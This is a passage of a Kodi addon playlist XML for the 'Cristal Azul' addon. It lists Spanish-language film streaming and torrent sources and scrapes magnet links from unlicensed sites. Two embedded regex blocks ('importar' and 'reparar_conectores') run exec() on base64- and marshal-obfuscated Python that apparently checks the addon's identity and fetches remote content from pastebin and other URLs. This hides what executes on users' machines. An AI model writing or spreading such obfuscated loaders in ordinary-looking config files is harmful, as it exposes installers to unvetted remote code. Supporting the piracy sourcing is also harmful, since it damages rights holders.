  html = requests.get('https://www.cinecalidad.is'+url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://www.cinecalidad.is/espana'}, verify=False).text
  return re.findall('href="(magnet.*?)"', html)[0]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<expres>$pyFunction:('[makelist.param3][makelist.param5]').replace('Jetload','https://jetload.net/p/$doregex[final-feliz]').replace('Gounlimited','https://gounlimited.to/$doregex[final-feliz]').replace('Openplay','https://player.openplay.vip/player.php?id=$doregex[final-feliz]').replace('Mega','https://mega.nz/file/$doregex[final-feliz]').replace('Vidcloud','https://vidcloud.co/v/$doregex[final-feliz]').replace('Netu','https://waaw.tv/watch_video.php?v=$doregex[final-feliz]').replace('Fembed','https://www.fembeder.com/f/$doregex[final-feliz]').replace('Trailer','https://www.youtube.com/watch?v=$doregex[final-feliz]').replace('Torrent','$doregex[final-feliz]')</expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/PfGj27S.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
</item>






<!--
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cine Calidad [COLOR white]web[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/PfGj27S.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>https://pastebin.com/raw/XDhZET75</externallink>
</item>
-->


<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Dospelis [COLOR white]web[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/Cma9eUb.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>https://pastebin.com/raw/jnFB9iUD</externallink>
</item>

<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Somosgnula [COLOR white]web[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/Cma9eUb.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>https://pastebin.com/raw/jStFDBYc$$LSProEncKey= $$</externallink>
</item>


<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Repelis [COLOR white]web[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/Cma9eUb.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>https://pastebin.com/raw/ij4KEbh9$$LSProEncKey= $$</externallink>
</item>


<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Verpeliculasultra [COLOR white]web[/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/Cma9eUb.jpg</thumbnail>
<fanart>https://i.imgur.com/YJvk7cD.jpg</fanart>
<externallink>https://pastebin.com/raw/dEqcsLq1$$LSProEncKey= $$</externallink>
</item>


<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]And The Oscar [COLOR white]Goes To... [COLOR red][/COLOR]</title>
<link>http://Ignoreme</link>
<jsonrpc>plugin://plugin.video.cristalazul/?fanart=https%3a%2f%2fi.imgur.com%2f3z5tAFE.jpg&amp;mode=1&amp;name=%5bCOLOR%20gold%5d%2a%5b%2fCOLOR%5d%20%5bCOLOR%20lightsalmon%5dAnd%20The%20Oscar%20%5bCOLOR%20white%5dGoes%20To...%5b%2fCOLOR%5d&amp;regexs=%7bu%27c%27%3a%20%7b%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnimport%20urllib%2c%20re%2c%20requests%2c%20xbmcgui%2c%20xbmc%2c%20xbmcaddon%2c%20time%5cr%5cnimport%20os%5cr%5cndef%20GetLSProData(page_data%2cCookie_Jar%2cm)%3a%5cr%5cn%5cr%5cn%20%20%20%20xbmc.executebuiltin(%5c%27PlayMedia(%22https%3a%2f%2farchive.org%2fdownload%2foscars.theme%2fOscars.Theme.mp3%22%2c1)%5c%27)%5cr%5cn%20%20%20%20time.sleep(%201%20)%5cr%5cn%20%20%20%20return%20%5c%27http%3a%2f%2fbit.ly%2fespeciallososcars%5c%27%5cr%5cn%27%2c%20%27name%27%3a%20u%27c%27%2c%20%27page%27%3a%20None%7d%2c%20u%27comecristal%27%3a%20%7b%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cndef%20GetLSProData(page_data%2cCookie_Jar%2cm)%3a%5cr%5cn%20import%20xbmc%5cr%5cn%20import%20xbmcaddon%5cr%5cn%20addon%20%3d%20xbmcaddon.Addon(%5c%27plugin.video.cristalazul%5c%27)%5cr%5cn%20Url%20%3d%20%5c%27link%5b%3a%3a4%5d%20%2b%20url%5b%3a8%5d%20%2b%20Creditos%5b62%3a%5d%20%3d%20http%3a%2f%2fbit.ly%2fsourcecristalazul%5c%27%5cr%5cn%20grupotelegram%20%3d%20%5c%27http%3a%2f%2ft.me%2faddonfestaycristal%5c%27%5cr%5cn%20Creditos%20%3d%20%5c%27el_addon_cristalazul_fue_creado_por_el_grupo_festa_para_el_disfrute_en%20familia%2c%20este_addon_es_completamente_gratuito%2cdisfrute_de_la_seccion_de_tv_premium%5c%27%5cr%5cn%20cristal%20%3d%20%5c%27jdt_cristal_azul_para_todos_gratuita_creada_por_picapau_y_lourdes%5c%27%5cr%5cn%20info%20%3d%20%5c%27british.true.Build.py%20%257%2f%5c%27%5cr%5cn%20return%20%20grupotelegram%5b%3a7%5d%20%2b%20info%5b%3a%3a4%5d%20%2b%20cristal%5b%3a3%5d%20%2b%20Creditos%5b146%3a%5d%5cr%5cndef%20revist_dag(page_data)%3a%5cr%5cn%20%20final_url%20%3d%20%5c%27%5c%27%5cr%5cn%20%20if%20%5c%27127.0.0.1%5c%27%20in%20page_data%3a%5cr%5cn%20%20%20%20%20%20final_url%20%3d%20re_me(page_data%2c%20%5c%27%26ver_t%3d(%5b%5e%26%5d%2b)%26%5c%27)%20%2b%20%5c%27%20live%3dtrue%20timeout%3d15%20playpath%3d%5c%27%20%2b%20re_me(page_data%2c%20%5c%27%5c%5c%5c%5c%3fy%3d(%5ba-zA-Z0-9-_%5c%5c%5c%5c.%40%5d%2b)%5c%27)%5cr%5cn%20%5cr%5cn%20%20if%20re_me(page_data%2c%20%5c%27token%3d(%5b%5e%26%5d%2b)%26%5c%27)%20!%3d%20%5c%27%5c%27%3a%5cr%5cn%20%20%20%20%20%20final_url%20%3d%20final_url%20%2b%20%5c%27%3ftoken%3d%5c%27%20%2b%20re_me(page_data%2c%20%5c%27token%3d(%5b%5e%26%5d%2b)%26%5c%27)%5cr%5cn%20%20elif%20re_me(page_data%2c%20%5c%27wmsAuthSign%253D(%5b%5e%25%26%5d%2b)%5c%27)%20!%3d%20%5c%27%5c%27%3a%5cr%5cn%20%20%20%20%20%20final_url%20%3d%20re_me(page_data%2c%20%5c%27%26ver_t%3d(%5b%5e%26%5d%2b)%26%5c%27)%20%2b%20%5c%27%3fwmsAuthSign%3d%5c%27%20%2b%20re_me(page_data%2c%20%5c%27wmsAuthSign%253D(%5b%5e%25%26%5d%2b)%5c%27)%20%2b%20%5c%27%3d%3d%2fmp4%3a%5c%27%20%2b%20re_me(page_data%2c%20%5c%27%5c%5c%5c%5c%3fy%3d(%5b%5e%26%5d%2b)%26%5c%27)%5cr%5cn%20%20else%3a%5cr%5cn%20%20%20%20%20%20final_url%20%3d%20re_me(page_data%2c%20%5c%27HREF%3d%22(%5b%5e%22%5d%2b)%22%5c%27)%5cr%5cn%20%5cr%5cn%20%20if%20%5c%27dag1.asx%5c%27%20in%20final_url%3a%5cr%5cn%20%20%20%20%20%20return%20get_dag_url(final_url)%5cr%5cn%20%5cr%5cn%20%20if%20%5c%27devinlivefs.fplive.net%5c%27%20not%20in%20final_url%3a%5cr%5cn%20%20%20%20%20%20final_url%20%3d%20final_url.replace(%5c%27devinlive%5c%27%2c%20%5c%27flive%5c%27)%5cr%5cn%20%20if%20%5c%27permlivefs.fplive.net%5c%27%20not%20in%20final_url%3a%5cr%5cn%20%20%20%20%20%20final_url%20%3d%20final_url.replace(%5c%27permlive%5c%27%2c%20%5c%27flive%5c%27)%5cr%5cn%20%20return%20%5c%27%5c%27%5cr%5cn%27%2c%20%27name%27%3a%20u%27comecristal%27%2c%20%27page%27%3a%20None%7d%7d&amp;url=%24doregex%5bc%5d</jsonrpc>
<thumbnail>https://i.imgur.com/sjVioN9.jpg</thumbnail>
<fanart>https://i.imgur.com/RsLj1lh.jpg</fanart>
</item>



<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Seleccion Cristal [COLOR white]Torrents [COLOR green][/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/mYbq6ew.jpg</thumbnail>
<fanart>https://i.imgur.com/RsLj1lh.jpg</fanart>
<externallink>https://pastebin.com/raw/jRDWbwr7</externallink>
</item>







